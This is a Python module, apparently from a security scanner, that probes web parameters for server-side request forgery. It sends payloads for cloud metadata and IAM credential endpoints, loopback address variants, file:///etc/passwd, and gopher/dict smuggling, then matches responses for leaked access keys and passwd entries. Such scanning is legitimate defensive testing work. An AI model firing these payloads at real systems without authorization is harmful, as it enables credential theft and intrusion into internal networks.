"""
Server-Side Request Forgery (SSRF) detection engine.

Detection strategies:
1. OAST callback: fastest signal — target fetches our OAST server
2. Cloud metadata probing: AWS/GCP/Azure metadata endpoints
3. Internal service access: loopback, RFC1918, link-local
4. IP representation bypass: hex, decimal, octal, IPv6-mapped variants
5. Protocol smuggling: gopher://, dict://, file:///
"""
from __future__ import annotations

import re
from typing import Optional

import structlog

from nightfall.bypass.encoders import ip_variants
from nightfall.core.http import Evidence

logger = structlog.get_logger(__name__)


# ── SSRF Target URLs ────────────────────────────────────────────────────────

def _build_ssrf_targets(oast_domain: str | None, nonce: str | None) -> list[dict]:
    """Build the full SSRF target list."""
    targets = []

    # OOB callback — fastest signal
    if oast_domain and nonce:
        targets.append({
            "url": f"http://{nonce}.{oast_domain}/",
            "name": "oast-callback",
            "signal": "oob",
        })

    # Cloud metadata endpoints
    targets.extend([
        {"url": "http://169.254.169.254/latest/meta-data/", "name": "aws-metadata", "signal": "metadata"},
        {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "name": "aws-iam", "signal": "metadata"},
        {"url": "http://169.254.169.254/latest/user-data/", "name": "aws-userdata", "signal": "metadata"},
        {"url": "http://metadata.google.internal/computeMetadata/v1/", "name": "gcp-metadata", "signal": "metadata"},
        {"url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "name": "azure-metadata", "signal": "metadata"},
        {"url": "http://100.100.100.200/latest/meta-data/", "name": "alibaba-metadata", "signal": "metadata"},
    ])

    # Internal services
    targets.extend([
        {"url": "http://127.0.0.1/", "name": "loopback", "signal": "internal"},
        {"url": "http://127.0.0.1:8080/", "name": "loopback-8080", "signal": "internal"},
        {"url": "http://127.0.0.1:3000/", "name": "loopback-3000", "signal": "internal"},
        {"url": "http://127.0.0.1:9090/", "name": "loopback-9090", "signal": "internal"},
        {"url": "http://localhost/admin", "name": "localhost-admin", "signal": "internal"},
        {"url": "http://[::1]/", "name": "ipv6-loopback", "signal": "internal"},
        {"url": "http://0.0.0.0/", "name": "any-interface", "signal": "internal"},
    ])

    # IP representation variants for 127.0.0.1
    for variant in ip_variants("127.0.0.1"):
        if variant != "127.0.0.1":  # already covered above
            targets.append({
                "url": f"http://{variant}/",
                "name": f"ip-variant-{variant}",
                "signal": "internal",
            })

    # Protocol smuggling
    targets.extend([
        {"url": "file:///etc/passwd", "name": "file-proto", "signal": "file-content"},
        {"url": "file:///c:/windows/win.ini", "name": "file-proto-win", "signal": "file-content"},
        {"url": "gopher://127.0.0.1:25/", "name": "gopher-smtp", "signal": "internal"},
        {"url": "dict://127.0.0.1:6379/INFO", "name": "dict-redis", "signal": "internal"},
    ])

    return targets


# ── Content Markers ──────────────────────────────────────────────────────────

METADATA_MARKERS = re.compile(
    r"(ami-id|instance-id|instance-type|hostname|local-ipv4|"
    r"iam/security-credentials|AccessKeyId|SecretAccessKey|"
    r"computeMetadata|instance/attributes|"
    r"microsoft\.compute|azEnvironment|"
    r"meta-data/placement)",
    re.I,
)

FILE_CONTENT_MARKERS = re.compile(
    r"(root:.*:0:0:|/bin/bash|daemon:|www-data:|"
    r"\[boot loader\]|\[fonts\]|for 16-bit app support)",
    re.I,
)

INTERNAL_MARKERS = re.compile(
    r"(Apache|nginx|Tomcat|IIS|admin|dashboard|"
    r"internal|management|Welcome to|Index of /|"
    r"redis_version|connected_clients|Unauthorized)",
    re.I,
)


async def ssrf_engine(ctx, step: dict, obj) -> Optional[Evidence]:
    """SSRF detection pipeline.

    URL-typed parameters are prioritized by the LLM planner — that's the
    biggest request-volume win. Targets: metadata, loopback, RFC1918, protocol smuggling.
    """
    url = step.get("endpoint", "")
    params = dict(step.get("params", {}))
    method = step.get("method", "GET")

    if not params:
        params = {"url": "http://example.com"}

    # Identify URL-typed parameters
    url_params = []
    for key, value in params.items():
        if any(indicator in key.lower() for indicator in
               ("url", "uri", "link", "src", "href", "path", "file", "page",
                "redirect", "callback", "return", "next", "dest", "target",
                "fetch", "load", "proxy", "image", "img")):
            url_params.append(key)

    # If no obvious URL params, test the first parameter
    if not url_params:
        url_params = [list(params.keys())[0]]

    # Build targets
    nonce = ctx.oast.nonce() if ctx.oast else None
    targets = _build_ssrf_targets(
        ctx.oast.domain if ctx.oast else None,
        nonce,
    )

    for target_param in url_params:
        # Get baseline for comparison
        baseline_ev = await ctx.pool.send(method, url, params=params)

        for target in targets[:25]:  # Budget cap
            test_params = {**params, target_param: target["url"]}
            ev = await ctx.pool.send(method, url, params=test_params)

            # ── Check OOB callback ───────────────────────────────────────
            if target["signal"] == "oob" and nonce and ctx.oast:
                if await ctx.oast.poll(nonce, timeout=6):
                    ev.vuln_class = "ssrf"
                    ev.subtype = "oob-confirmed"
                    ev.param = target_param
                    ev.payload = target["url"]
                    ev.oob_nonce = nonce
                    ev.confidence = 0.95
                    ev.severity = "critical"
                    ev.evidence_snip = f"OOB callback from SSRF payload: {target['name']}"
                    ev.remediation = (
                        "Validate and whitelist URLs server-side. Block requests to "
                        "internal/metadata IPs. Use allowlists, not denylists."
                    )
                    logger.info("ssrf_oob_confirmed", url=url, param=target_param, target=target["name"])
                    return ev

            # ── Check for metadata content ───────────────────────────────
            if target["signal"] == "metadata" and METADATA_MARKERS.search(ev.response_body):
                ev.vuln_class = "ssrf"
                ev.subtype = "cloud-metadata"
                ev.param = target_param
                ev.payload = target["url"]
                ev.confidence = 0.9
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:500]
                ev.remediation = (
                    "Block requests to cloud metadata endpoints (169.254.169.254). "
                    "Use IMDSv2 on AWS. Whitelist allowed URL targets."
                )
                logger.info("ssrf_metadata_confirmed", url=url, param=target_param, target=target["name"])
                return ev

            # ── Check for file content ───────────────────────────────────
            if target["signal"] == "file-content" and FILE_CONTENT_MARKERS.search(ev.response_body):
                ev.vuln_class = "ssrf"
                ev.subtype = "file-read"
                ev.param = target_param
                ev.payload = target["url"]
                ev.confidence = 0.9
                ev.severity = "critical"
                ev.evidence_snip = ev.response_body[:500]
                ev.remediation = "Disable file:// protocol handler. Whitelist URL schemes to http/https only."
                return ev

            # ── Check for internal service access ────────────────────────
            if target["signal"] == "internal":
                # Compare with baseline — significant content difference suggests SSRF
                if ev.response_status == 200 and baseline_ev.response_status != 200:
                    ev.vuln_class = "ssrf"
                    ev.subtype = "internal-reach"
                    ev.param = target_param
                    ev.payload = target["url"]
                    ev.confidence = 0.6
                    ev.severity = "high"
                    ev.evidence_snip = ev.response_body[:500]
                    ev.remediation = "Block requests to internal/RFC1918 addresses."
                    logger.info("ssrf_internal_access", url=url, param=target_param, target=target["name"])
                    return ev

                # Check for internal-looking content in successful response
                if ev.response_status == 200 and INTERNAL_MARKERS.search(ev.response_body):
                    if not INTERNAL_MARKERS.search(baseline_ev.response_body):
                        ev.vuln_class = "ssrf"
                        ev.subtype = "internal-reach"
                        ev.param = target_param
                        ev.payload = target["url"]
                        ev.confidence = 0.65
                        ev.severity = "high"
                        ev.evidence_snip = ev.response_body[:500]
                        ev.remediation = "Block internal network access from URL parameters."
                        return ev

                # Timing-based: internal requests may be faster than external
                if ev.latency_ms > 3000 and baseline_ev.latency_ms < 500:
                    ev.vuln_class = "ssrf"
                    ev.subtype = "timing-anomaly"
                    ev.param = target_param
                    ev.payload = target["url"]
                    ev.confidence = 0.4
                    ev.severity = "medium"
                    ev.extra = {
                        "target_latency_ms": ev.latency_ms,
                        "baseline_latency_ms": baseline_ev.latency_ms,
                    }
                    ev.remediation = "Investigate URL parameter handling for SSRF."
                    return ev

    logger.debug("ssrf_no_signal", url=url)
    return None
